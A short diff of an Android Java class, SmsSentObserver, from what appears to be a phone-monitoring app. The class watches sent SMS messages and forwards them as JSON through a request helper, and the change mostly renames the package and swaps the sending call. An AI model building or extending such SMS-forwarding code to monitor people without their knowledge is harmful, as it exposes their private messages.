@@ -1,4 +1,4 @@
-package com.inet.android.sms;
+package com.inet.android.message;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -11,7 +11,7 @@ import android.net.Uri;
 import android.os.Handler;
 
 import com.inet.android.request.ConstantValue;
-import com.inet.android.request.DataRequest;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.ValueWork;
@@ -120,10 +120,7 @@ public class SmsSentObserver extends ContentObserver {
 											"json сломался");
 								}
 
-								DataRequest dr = new DataRequest(mContext);
-								dr.sendRequest(sendJSONStr);
-
-								Logging.doLog(TAG, sendJSONStr, sendJSONStr);
+								RequestList.sendDataRequest(sendJSONStr, mContext);
 
 								/*
 								 * if(colNames != null){ for(int k=0;
